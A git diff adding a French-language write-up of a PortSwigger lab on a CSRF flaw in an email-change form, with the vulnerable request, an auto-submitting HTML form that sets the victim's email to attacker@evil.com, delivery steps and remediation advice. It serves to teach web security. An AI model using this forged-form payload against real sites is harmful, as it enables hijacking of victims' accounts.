@@ -24,6 +24,7 @@ Labs résolus de la Web Security Academy : access control, authentification, SSR
 - [Lab 16 — Reflected XSS into HTML context with nothing encoded](#lab-16--reflected-xss-into-html-context-with-nothing-encoded)
 - [Lab 17 — SQL injection attack, querying the database type and version on Oracle](#lab-17--sql-injection-attack-querying-the-database-type-and-version-on-oracle)
 - [Lab 18 — Basic password reset poisoning](#lab-18--basic-password-reset-poisoning)
+- [Lab 19 — CSRF vulnerability with no defenses](#lab-19--csrf-vulnerability-with-no-defenses)
 
 ---
 
@@ -641,3 +642,88 @@ given post, whose title is passed via the location.hash property.
 To solve the lab, deliver an exploit to the victim that calls the
 print() function in their browser.
 
+
+[⬆ Sommaire](#sommaire)
+
+## Lab 19 — CSRF vulnerability with no defenses
+
+**Catégorie :** CSRF (Cross-Site Request Forgery)
+
+**Difficulté :** Apprentice
+
+This lab's email change functionality is vulnerable to CSRF.
+
+To solve the lab, craft some HTML that uses a CSRF attack to change
+the viewer's email address and upload it to the exploit server.
+
+Identifiants fournis : `wiener:peter`.
+
+**Contexte :**
+
+La fonctionnalité de changement d'email (`/my-account/change-email`)
+ne possède **aucune protection CSRF** : pas de token anti-CSRF dans le
+formulaire, pas de vérification des headers `Origin`/`Referer`, et le
+cookie de session n'a pas d'attribut `SameSite` restrictif. N'importe
+quel site tiers peut donc forger une requête qui sera exécutée avec la
+session de la victime, sans qu'elle s'en aperçoive.
+
+Requête légitime observée dans Burp (Proxy > HTTP history) :
+
+    POST /my-account/change-email HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=...
+    Content-Type: application/x-www-form-urlencoded
+
+    email=test@test.com
+
+**Résolution :**
+
+On construit une page HTML qui soumet automatiquement un formulaire
+vers l'endpoint vulnérable, avec l'email de notre choix :
+
+    <html>
+      <body>
+        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+          <input type="hidden" name="email" value="attacker@evil.com" />
+        </form>
+        <script>
+          document.forms[0].submit();
+        </script>
+      </body>
+    </html>
+
+On héberge ce fichier sur le serveur d'exploit fourni par PortSwigger
+(*Go to exploit server*) :
+
+- **File :** `/exploit`
+- **Head :** `HTTP/1.1 200 OK` / `Content-Type: text/html; charset=utf-8`
+- **Body :** le HTML ci-dessus
+
+On clique **Store** pour l'enregistrer, puis **Deliver exploit to
+victim**. Le navigateur de la victime (authentifiée sur le lab) charge
+la page, le formulaire se soumet seul via le `<script>`, et le cookie
+de session est envoyé automatiquement par le navigateur puisque la
+requête vise le même domaine que le cookie — le CSRF n'a besoin de
+rien d'autre.
+
+**Pourquoi ça marche :**
+
+Le navigateur attache toujours les cookies d'un domaine aux requêtes
+qui lui sont destinées, même si la page qui déclenche la requête vient
+d'une origine totalement différente (ici le serveur d'exploit). Sans
+token CSRF ni `SameSite=Strict/Lax` sur le cookie de session, le
+serveur ne peut pas distinguer une requête volontaire de la victime
+d'une requête forgée par un tiers.
+
+**Remédiation :**
+
+- Token CSRF unique par session, vérifié côté serveur sur chaque
+  requête de modification d'état.
+- Cookie de session avec `SameSite=Lax` (ou `Strict`), qui empêche le
+  navigateur d'envoyer le cookie sur une requête cross-site de type
+  `POST`.
+- Vérification du header `Origin` ou `Referer` en complément, jamais
+  comme seule protection (ces headers peuvent être absents ou
+  manipulés dans certains contextes).
+
+[⬆ Sommaire](#sommaire)
